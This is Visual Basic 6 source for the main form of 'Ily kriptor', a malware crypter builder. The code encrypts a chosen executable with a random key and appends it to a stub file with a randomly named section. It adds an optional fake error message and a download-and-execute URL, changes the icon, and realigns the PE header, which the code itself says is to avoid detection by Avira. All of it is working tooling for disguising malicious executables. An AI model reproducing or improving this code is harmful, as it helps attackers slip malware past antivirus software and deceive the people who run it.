VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "comdlg32.ocx"
Begin VB.Form frmMain 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Ily kriptor Version 1"
   ClientHeight    =   4500
   ClientLeft      =   45
   ClientTop       =   375
   ClientWidth     =   7455
   Icon            =   "frmMain.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   4500
   ScaleWidth      =   7455
   StartUpPosition =   3  'Windows Default
   Begin VB.TextBox enckey 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      Enabled         =   0   'False
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000005&
      Height          =   270
      Left            =   3960
      TabIndex        =   14
      Top             =   3840
      Width           =   2175
   End
   Begin Ilykriptor.chameleonButton chameleonButton2 
      Height          =   255
      Left            =   6240
      TabIndex        =   11
      Top             =   3840
      Width           =   855
      _ExtentX        =   1508
      _ExtentY        =   450
      BTYPE           =   14
      TX              =   "New"
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   1
      FOCUSR          =   -1  'True
      BCOL            =   15790320
      BCOLO           =   15790320
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   12632256
      MPTR            =   1
      MICON           =   "frmMain.frx":15162
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   0
      HAND            =   0   'False
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin Ilykriptor.chameleonButton chameleonButton4 
      Height          =   255
      Left            =   720
      TabIndex        =   15
      Top             =   3480
      Width           =   2415
      _ExtentX        =   4260
      _ExtentY        =   450
      BTYPE           =   14
      TX              =   "Change Icon"
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   1
      FOCUSR          =   -1  'True
      BCOL            =   15790320
      BCOLO           =   15790320
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   12632256
      MPTR            =   1
      MICON           =   "frmMain.frx":1517E
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   0
      HAND            =   0   'False
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin VB.PictureBox Picture1 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      ForeColor       =   &H80000008&
      Height          =   4575
      Left            =   0
      Picture         =   "frmMain.frx":1519A
      ScaleHeight     =   4545
      ScaleWidth      =   7545
      TabIndex        =   0
      Top             =   0
      Width           =   7575
      Begin Ilykriptor.chameleonButton chameleonButton5 
         Height          =   255
         Left            =   720
         TabIndex        =   19
         Top             =   3120
         Width           =   2415
         _ExtentX        =   4260
         _ExtentY        =   450
         BTYPE           =   14
         TX              =   "Load new stub"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   15790320
         BCOLO           =   15790320
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":34FD1
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Ilykriptor.chameleonButton chameleonButton6 
         Height          =   375
         Left            =   6120
         TabIndex        =   10
         Top             =   1560
         Width           =   1095
         _ExtentX        =   1931
         _ExtentY        =   661
         BTYPE           =   14
         TX              =   "Browse ..."
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   15790320
         BCOLO           =   15790320
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":34FED
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin MSComDlg.CommonDialog saveDiag 
         Left            =   120
         Top             =   0
         _ExtentX        =   847
         _ExtentY        =   847
         _Version        =   393216
      End
      Begin MSComDlg.CommonDialog filediag 
         Left            =   120
         Top             =   600
         _ExtentX        =   847
         _ExtentY        =   847
         _Version        =   393216
      End
      Begin Ilykriptor.chameleonButton chameleonButton1 
         Height          =   255
         Left            =   720
         TabIndex        =   5
         Top             =   2400
         Width           =   2415
         _ExtentX        =   4260
         _ExtentY        =   450
         BTYPE           =   14
         TX              =   "Add Fake Message"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   15790320
         BCOLO           =   15790320
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":35009
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin VB.PictureBox cryptbtn 
         BackColor       =   &H00E0E0E0&
         BorderStyle     =   0  'None
         Height          =   495
         Left            =   5400
         Picture         =   "frmMain.frx":35025
         ScaleHeight     =   495
         ScaleWidth      =   1215
         TabIndex        =   4
         Top             =   2880
         Width           =   1215
      End
      Begin VB.TextBox filepath 
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         Enabled         =   0   'False
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   360
         Left            =   3960
         TabIndex        =   3
         Top             =   1560
         Width           =   2055
      End
      Begin VB.CheckBox chkrealign 
         Appearance      =   0  'Flat
         BackColor       =   &H00C0C0C0&
         Caption         =   "Realign PE Header"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   600
         MaskColor       =   &H000000FF&
         TabIndex        =   2
         Top             =   2040
         Value           =   1  'Checked
         Width           =   1815
      End
      Begin VB.CheckBox chkeof 
         Appearance      =   0  'Flat
         BackColor       =   &H00C0C0C0&
         Caption         =   "Conserve EOF Data"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   600
         TabIndex        =   1
         Top             =   1680
         Width           =   1815
      End
      Begin Ilykriptor.chameleonButton chameleonButton3 
         Height          =   255
         Left            =   720
         TabIndex        =   6
         Top             =   2760
         Width           =   2415
         _ExtentX        =   4260
         _ExtentY        =   450
         BTYPE           =   14
         TX              =   "Download && Exec File"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   15790320
         BCOLO           =   15790320
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":37DDB
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin VB.Label stat 
         Alignment       =   2  'Center
         BackStyle       =   0  'Transparent
         BeginProperty Font 
            Name            =   "Verdana"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H000000FF&
         Height          =   255
         Left            =   3720
         TabIndex        =   17
         Top             =   1920
         Width           =   1575
      End
      Begin VB.Label Label4 
         BackStyle       =   0  'Transparent
         Caption         =   "Encryption key:"
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   3960
         TabIndex        =   13
         Top             =   3600
         Width           =   1215
      End
      Begin VB.Label stubstat 
         Alignment       =   1  'Right Justify
         BackStyle       =   0  'Transparent
         Caption         =   "[ Stub ]"
         BeginProperty Font 
            Name            =   "Verdana"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H000000FF&
         Height          =   375
         Left            =   4680
         TabIndex        =   9
         Top             =   1920
         Width           =   1335
      End
      Begin VB.Label Label1 
         BackStyle       =   0  'Transparent
         Caption         =   "Version 1.0"
         ForeColor       =   &H00000000&
         Height          =   375
         Left            =   6240
         TabIndex        =   7
         Top             =   4200
         Width           =   1575
      End
   End
   Begin VB.Label Label6 
      BackStyle       =   0  'Transparent
      Caption         =   "Encryption key:"
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Left            =   0
      TabIndex        =   18
      Top             =   0
      Width           =   1575
   End
   Begin VB.Label Label5 
      Alignment       =   2  'Center
      BackStyle       =   0  'Transparent
      Caption         =   "[ Stub ]"
      BeginProperty Font 
         Name            =   "Verdana"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   615
      Left            =   0
      TabIndex        =   16
      Top             =   0
      Width           =   1575
   End
   Begin VB.Label Label2 
      BackStyle       =   0  'Transparent
      Caption         =   "Version 3.0.1 Rev 1"
      ForeColor       =   &H00FFFFFF&
      Height          =   375
      Left            =   0
      TabIndex        =   12
      Top             =   0
      Width           =   1575
   End
   Begin VB.Label Label3 
      BackStyle       =   0  'Transparent
      Caption         =   "Please select a file"
      BeginProperty Font 
         Name            =   "Verdana"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   255
      Left            =   0
      TabIndex        =   8
      Top             =   0
      Width           =   1935
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

Public fakeError As Boolean
Public downloadfile As Boolean
Public errormsg As String
Public fileUrl As String

Dim fileString As String
Dim rc4key As String
Dim del As String
Dim SecName As String

Dim stubString As String
Dim finalFile As String

Public iconpath As String
Public changeico As Boolean
Dim bf As New Class1
Private Sub chameleonButton1_Click()
    frmError.Show
End Sub

Private Sub chameleonButton2_Click()
    RandKey
End Sub

Private Sub chameleonButton3_Click()
    frmOptions.Show
End Sub

Private Sub chameleonButton4_Click()
    frmIcon.Show
End Sub

Private Sub chameleonButton5_Click()
    On Error Resume Next
    filediag.ShowOpen
    loadstub filediag.FileName
End Sub

Private Sub chameleonButton6_Click()
    On Error Resume Next
    filediag.Filter = ".exe | * .exe"
    filediag.ShowOpen
    filepath.Text = filediag.FileName
End Sub

Private Sub chkrealign_Click()
    If chkrealign.Value = 0 Then
        MsgBox "Disabling this will most likely cause a detection by Avira.", vbInformation, "Warning"
    End If
End Sub

Private Sub cryptbtn_Click()
    stat.Caption = "Crypting..."
    On Error Resume Next
    If filepath = "" Then Exit Sub
    Dim Key As String
    Key = rc4key
    Dim s As String, L As Long, i As Integer
    L = FileLen(filepath.Text)
    Open filepath.Text For Binary As #1
    s = Space(L)
    Get #1, , s
    Close #1

    fileString = bf.crptstr(s, Key)
    
    If fakeError = False Then errormsg = "empty"
    If downloadfile = False Then fileUrl = "empty"
    
    
   
    
    saveDiag.Filter = ".exe | *.exe"
    saveDiag.ShowSave
    
    FileCopy App.path & "\stub.exe", saveDiag.FileName
    AddSection saveDiag.FileName, SecName, 500, &H8
    Open saveDiag.FileName For Binary As #1
     finalFile = del & fileString & del & rc4key & del & bf.crptstr(errormsg, rc4key) & del & bf.crptstr(fileUrl, rc4key)
    Put #1, LOF(1) + 1, finalFile
    Close #1
    
        If changeico = True And iconpath <> "" Then
        changeIcon saveDiag.FileName, iconpath
    End If
    
    If chkrealign.Value = 1 Then RealignPEFromFile saveDiag.FileName
    
    stat.Caption = "Complete."
    MsgBox "Encryption complete."
    
    
    
End Sub

Private Sub Form_Load()
    Randomize
    If Dir("stub.exe") <> "" Then
    Else
        stubstat.Caption = "Stub.exe not found."
        MsgBox "Error: Stub.exe was not found. Please ensure it's in the same directory", vbCritical, "Error"
    End If
    RandKey
    loadstub
    
    getDel
End Sub
Function Random(Lowerbound As Long, Upperbound As Long)
    Randomize
    Random = Int((Upperbound - Lowerbound) * Rnd + Lowerbound)
End Function

Private Sub RandKey()
    Dim Key As String, i As Integer
    For i = 0 To Random(10, 20)
        Key = Key & Chr(Random(97, 122))
    Next i
    rc4key = Key
    enckey.Text = Key
End Sub
Private Sub sectioname()
    Dim sec As String, i As Integer
    For i = 0 To Random(10, 20)
        sec = sec & Chr(Random(97, 122))
    Next i
    SecName = sec
End Sub
Public Sub loadstub(Optional path As String = "stub.exe")
    On Error Resume Next
    Open "stub.exe" For Binary As #1
        stubString = Space(LOF(1))
        Get #1, , stubString
    Close #1
    Dim p2 As String
    p2 = Split(path, "\")(UBound(Split(path, "\")))
    stubstat.Caption = "Stub file loaded [" & p2 & "]"
    stubstat.ForeColor = &H55FF55
    
End Sub
Public Sub getDel()
    del = Right(stubString, 10)
End Sub
Private Function nullVal(num As Integer) As String
Dim i As Integer, ret As String
    For i = 1 To num
        ret = ret & Chr(0)
    Next i
    nullVal = ret
End Function

